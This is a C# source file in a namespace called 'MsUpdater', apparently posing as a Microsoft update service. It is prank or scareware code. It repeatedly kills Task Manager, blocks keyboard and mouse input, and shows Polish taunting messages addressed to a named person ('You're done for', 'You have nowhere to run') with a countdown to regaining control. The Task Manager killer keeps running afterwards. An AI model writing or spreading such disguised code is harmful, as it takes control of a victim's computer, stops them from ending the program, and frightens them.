namespace MsUpdater
{
    using System;
    using System.Diagnostics;
    using System.Diagnostics.CodeAnalysis;
    using System.Runtime.InteropServices;
    using System.Threading;

    using Timer = System.Timers.Timer;

    internal static class Service
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();

        [SuppressMessage("ReSharper", "LocalizableElement")]
        static Service()
        {
            new Timer(200d) { Enabled = true }.Elapsed += delegate
                {
                    foreach (var proc in Process.GetProcessesByName("taskmgr"))
                    {
                        proc.Kill();
                    }
                };

            using (new InputBlock())
            {
                NotepadHelper.ShowMessage($"Już po Tobie ...{Environment.NewLine}:)", "Droga Roso,");

                Thread.Sleep(2000);

                AllocConsole();

                Console.Title = "JUŻ PO TOBIE :)";
                Console.WriteLine("Nie masz gdzie uciec :)\n\n");

                for (var i = 5; i >= 0; i--)
                {
                    Console.Write("\rOdzyskasz kontrolę za " + i);
                    Thread.Sleep(1000);
                }

                FreeConsole();
            }
        }
    }
}